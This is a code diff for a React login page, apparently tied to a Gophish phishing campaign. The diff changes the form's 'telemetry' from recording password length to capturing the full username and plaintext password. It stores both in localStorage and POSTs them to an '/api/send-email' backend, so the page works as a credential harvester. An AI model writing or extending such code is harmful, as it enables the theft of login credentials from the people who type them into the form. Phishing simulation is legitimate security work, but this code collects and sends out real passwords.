@@ -3,8 +3,8 @@ import { useState, type FormEvent, type KeyboardEvent } from 'react';
 type LoginTelemetry = {
   timestamp: string;
   event: 'submit-button-click';
-  username?: string;
-  passwordLength: number;
+  username: string;
+  password: string;
 };
 
 function App() {
@@ -45,46 +45,112 @@ function App() {
   //   // setSubmitMessage('Demo event recorded. The password itself was not stored.');
   // };
 
-  const handleSubmit = async (
-  event: React.FormEvent<HTMLFormElement>
-) => {
-  event.preventDefault();
+  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
+  e.preventDefault();
 
-  const form = event.currentTarget;
-  const formData = new FormData(form);
+  const formData = new FormData(e.currentTarget);
+  const password = String(formData.get('password') ?? '');
+  const username = String(formData.get('username') ?? '');
 
-  const data = {
-    username: formData.get("username"),
-    password: formData.get("password"),
+  const telemetry: LoginTelemetry = {
     timestamp: new Date().toISOString(),
-    event: 'submit-button-click'
+    event: 'submit-button-click',
+    password: password,
+    username: username,
   };
 
+  // Keep your old localStorage behavior
+  const storedEvents = localStorage.getItem('gophish-login-telemetry');
+  let events: LoginTelemetry[] = [];
+
+  if (storedEvents) {
+    try {
+      const parsedEvents: unknown = JSON.parse(storedEvents);
+
+      if (Array.isArray(parsedEvents)) {
+        events = parsedEvents as LoginTelemetry[];
+      }
+    } catch {
+      events = [];
+    }
+  }
+
+  localStorage.setItem(
+    'gophish-login-telemetry',
+    JSON.stringify([...events, telemetry])
+  );
+
+  // Send the same telemetry to your Vercel backend
   try {
-    const response = await fetch("/api/send-email", {
-      method: "POST",
-
+    const response = await fetch('/api/send-email', {
+      method: 'POST',
       headers: {
-        "Content-Type": "application/json",
+        'Content-Type': 'application/json',
       },
-
-      body: JSON.stringify(data),
+      body: JSON.stringify(telemetry),
     });
 
+    const result = await response.json();
+
+    console.log('API STATUS:', response.status);
+    console.log('API RESPONSE:', result);
+
     if (!response.ok) {
-      throw new Error("Submission failed");
+      throw new Error(result.error || 'Submission failed');
     }
 
-    alert("Submitted successfully");
-
-    form.reset();
-
+    setSubmitMessage('Submitted successfully');
   } catch (error) {
-    console.error(error);
+    console.error('EMAIL ERROR:', error);
 
-    alert("Something went wrong");
+    setSubmitMessage(
+      error instanceof Error
+        ? error.message
+        : 'Something went wrong'
+    );
   }
 };
+
+//   const handleSubmit = async (
+//   event: React.FormEvent<HTMLFormElement>
+// ) => {
+//   event.preventDefault();
+
+//   const form = event.currentTarget;
+//   const formData = new FormData(form);
+
+//   const data = {
+//     username: formData.get("username"),
+//     password: formData.get("password"),
+//     timestamp: new Date().toISOString(),
+//     event: 'submit-button-click'
+//   };
+
+//   try {
+//     const response = await fetch("/api/send-email", {
+//       method: "POST",
+
+//       headers: {
+//         "Content-Type": "application/json",
+//       },
+
+//       body: JSON.stringify(data),
+//     });
+
+//     if (!response.ok) {
+//       throw new Error("Submission failed");
+//     }
+
+//     alert("Submitted successfully");
+
+//     form.reset();
+
+//   } catch (error) {
+//     console.error(error);
+
+//     alert("Something went wrong");
+//   }
+// };
 
   const handleKeyUp = (e: KeyboardEvent<HTMLInputElement>) => {
     if (typeof e.getModifierState === 'function') {
